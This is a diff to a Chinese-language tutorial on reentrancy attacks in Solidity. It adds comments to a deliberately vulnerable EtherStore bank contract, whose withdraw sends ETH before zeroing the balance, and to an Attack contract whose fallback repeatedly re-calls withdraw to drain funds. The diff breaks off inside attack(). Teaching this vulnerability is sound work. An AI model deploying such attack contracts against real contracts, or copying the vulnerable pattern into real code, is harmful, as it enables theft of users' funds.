@@ -4,12 +4,44 @@
 重入攻击的一个攻击点就是合约转账ETH的地方：转账ETH的目标地址如果是合约，会触发对方合约的fallback（回退）函数，从而造成循环调用的可能。当在攻击合约中的fallback()或receive()函数中重新调用了目标合约的withdraw()函数
 假设合约A调用合约B。
 重入攻击漏洞允许B在A完成执行之前回调A。
-## 银行合约
+## 银行合约例子
 ```solidity
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.17;
+contract EtherStore {
+    //mapping类型的变量balances，它将用户地址映射到其在合约中的以太币余额。
+    mapping(address => uint) public balances;
 
-/*
+    //deposit的函数，它允许用户将以太币存入合约。
+    //使用msg.sender来确定调用者的地址，并将msg.value中的以太币数量添加到该地址的余额中。
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    /*
+    withdraw的函数，它允许用户从合约中提取他们的以太币余额。
+    它首先检查调用者的余额是否大于零，如果不是，则函数会抛出异常。
+    然后它使用msg.sender.call来将以太币发送回调用者的地址。
+    如果发送失败，则函数会抛出异常。
+    最后，它将调用者的余额设置为零，以确保他们无法多次提取相同的余额。
+    */
+    function withdraw() public {
+        uint bal = balances[msg.sender];
+        require(bal > 0);
+
+        (bool sent, ) = msg.sender.call{value: bal}("");
+        require(sent, "Failed to send Ether");
+
+        balances[msg.sender] = 0;
+    }
+
+    // getBalance的帮助函数，它允许用户检查合约的余额。
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
+```
+## 攻击合约
 EtherStore是一个合约，您可以存入和取出ETH。该合约容易受到可重入攻击的威胁。让我们来看看为什么。
 
 1. 部署EtherStore
@@ -30,36 +62,12 @@ EtherStore是一个合约，您可以存入和取出ETH。该合约容易受到�
 - Attack.fallback (收到 1 Ether)
 - EtherStore.withdraw
 - Attack fallback (收到 1 Ether)
-*/
 
-contract EtherStore {
-    mapping(address => uint) public balances;
-
-    function deposit() public payable {
-        balances[msg.sender] += msg.value;
-    }
-
-    function withdraw() public {
-        uint bal = balances[msg.sender];
-        require(bal > 0);
-
-        (bool sent, ) = msg.sender.call{value: bal}("");
-        require(sent, "Failed to send Ether");
-
-        balances[msg.sender] = 0;
-    }
-
-    // Helper function to check the balance of this contract
-    function getBalance() public view returns (uint) {
-        return address(this).balance;
-    }
-}
-```
-## 攻击合约
 ```solidity
 contract Attack {
     EtherStore public etherStore;
 
+    //构造函数，接受一个EtherStore合约的地址作为参数，并将其存储在etherStore变量中。
     constructor(address _etherStoreAddress) {
         etherStore = EtherStore(_etherStoreAddress);
     }
@@ -70,7 +78,9 @@ contract Attack {
             etherStore.withdraw();
         }
     }
-
+    
+    //攻击函数，要求发送至少1 ether的以太币。
+    //将1 ether的以太币存入etherStore合约中，然后立即调用etherStore的withdraw()函数以取回所有以太币。
     function attack() external payable {
         require(msg.value >= 1 ether);
         etherStore.deposit{value: 1 ether}();
